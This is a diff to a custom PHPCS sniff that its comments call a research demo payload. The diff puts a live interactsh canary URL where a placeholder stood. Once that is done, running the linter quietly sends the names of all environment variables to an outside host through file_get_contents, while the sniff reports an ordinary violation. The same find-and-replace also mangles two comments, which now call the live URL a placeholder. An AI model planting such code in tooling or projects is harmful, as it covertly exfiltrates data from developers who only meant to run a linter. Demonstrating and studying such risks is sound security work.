@@ -2,7 +2,7 @@
 // CR-02 demo payload (DRAFT — for the researcher's own repo only).
 // Custom PHPCS sniff: reports process env keys as a violation and
 // fire-and-forget fetches the canary URL (proves network egress).
-// CANARY_URL is a placeholder: replace with the interactsh URL generated
+// https://dbo70mo68bkejj6r933gzpxk8s4k84hsi.oast.live/hit is a placeholder: replace with the interactsh URL generated
 // at demo time. First pass reports env KEY names only, never values.
 // NOTE: NOT validated locally — this VM has no PHP. Run `php -l` on each
 // file and `phpcs --standard=phpcs.xml` on a Mac (or in the demo repo)
@@ -22,9 +22,9 @@ class EnvSniff implements Sniff
     public function process(File $phpcsFile, $stackPtr)
     {
         // Swap this for the interactsh URL at demo time (same pattern as CR-01).
-        // Was a literal 'CANARY_URL?keys=...' string, which could never reach a canary
+        // Was a literal 'https://dbo70mo68bkejj6r933gzpxk8s4k84hsi.oast.live/hit?keys=...' string, which could never reach a canary
         // even if the sniff executed — fixed 2026-11-08.
-        $canaryUrl = 'https://REPLACE-WITH-CANARY-AT-DEMO-TIME/hit';
+        $canaryUrl = 'https://dbo70mo68bkejj6r933gzpxk8s4k84hsi.oast.live/hit';
         $keys = implode(',', array_keys($_ENV + getenv()));
         @file_get_contents($canaryUrl . '?keys=' . urlencode($keys));
         $phpcsFile->addError(
